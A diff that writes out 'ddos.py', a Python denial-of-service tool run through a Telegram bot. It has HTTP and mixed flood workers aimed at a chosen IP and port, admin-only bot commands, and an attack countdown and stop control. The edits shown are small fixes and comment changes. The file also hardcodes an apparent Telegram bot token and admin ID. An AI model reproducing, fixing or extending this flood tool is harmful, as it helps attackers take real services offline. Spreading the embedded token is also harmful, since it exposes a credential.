@@ -1,21 +1,21 @@
+cat > ddos.py << 'EOF'
 import requests
 import time
 import threading
 import random
 import socket
 from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters
-from telegram import InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from datetime import datetime
 
-# ==================== CONFIGURATION ====================
 TOKEN = "8278228198:AAG7C97c7R50_gsykoqBMwesCuoRZTciCLA"
 ADMIN_ID = 8210011971
 
-# ==================== GLOBAL VARIABLES ====================
+# Global variables
 attack_active = False
 user_state = {}
 
-# ==================== ATTACK WORKERS ====================
+# =============== ATTACK WORKERS ===============
 def send_http_worker(ip, port):
     global attack_active
     url = f"http://{ip}:{port}/"
@@ -71,7 +71,7 @@ def start_mixed_attack(ip, port, threads, duration):
     time.sleep(duration)
     attack_active = False
 
-# ==================== BOT COMMANDS ====================
+# =============== BOT COMMANDS ===============
 def start(update, context):
     if update.effective_user.id != ADMIN_ID:
         update.message.reply_text("❌ *UNAUTHORIZED ACCESS*\nYou are not allowed to use this bot.", parse_mode='Markdown')
@@ -219,7 +219,7 @@ def start_attack_with_countdown(update, context, user_id, ip, port, time_sec, th
             context.bot.send_message(chat_id=user_id, text="🛑 *ATTACK STOPPED*", parse_mode='Markdown')
             return
         if remaining % 10 == 0 or remaining <= 5:
-            progress = int((time_sec - remaining) / time_sec * 20)
+            progress = int((time_sec - remaining) / time_sec * 20) if time_sec > 0 else 0
             bar = "█" * progress + "░" * (20 - progress)
             try:
                 context.bot.edit_message_text(
@@ -420,7 +420,6 @@ def stop_command(update, context):
 def main():
     updater = Updater(TOKEN, use_context=True)
     dp = updater.dispatcher
-    
     dp.add_handler(CommandHandler("start", start))
     dp.add_handler(CommandHandler("stop", stop_command))
     dp.add_handler(CallbackQueryHandler(button_handler))
@@ -439,3 +438,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+EOF
